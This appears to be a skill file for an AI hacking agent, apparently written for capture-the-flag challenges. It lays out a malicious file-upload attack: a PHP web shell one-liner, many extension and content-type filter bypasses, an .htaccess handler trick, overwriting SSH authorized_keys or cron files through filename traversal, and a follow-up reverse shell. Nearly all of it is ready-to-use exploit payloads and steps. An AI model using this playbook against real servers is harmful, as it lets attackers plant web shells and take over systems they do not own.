---
name: file-upload
when: the app accepts a file upload and may serve or execute it
tools: [http_request, reverse_shell_listener]
phase: exploit
---
# Malicious file upload

Goal: upload code that the server executes, or overwrite a sensitive file.
- Web shell: upload `shell.php` (`<?php system($_GET['c']); ?>`) then browse to it and run `?c=cat /flag*`.
- Bypass extension filters: `shell.php5`, `.phtml`, `.pht`, `.phar`, double ext `shell.php.jpg`,
  trailing dot/space, null byte, case `.PhP`; set `Content-Type: image/png` while keeping php content;
  add a magic-byte prefix (`GIF89a;`) before `<?php`.
- .htaccess trick: upload `.htaccess` with `AddType application/x-httpd-php .xyz` then `shell.xyz`.
- Find where it lands: common dirs `/uploads/`, `/files/`, `/images/`; the response often reveals the path.
- Non-exec targets: overwrite config, SSH `authorized_keys`, or a cron/script path via traversal in the filename.
After RCE, `cat /flag*`, or use reverse_shell_listener for an interactive shell.
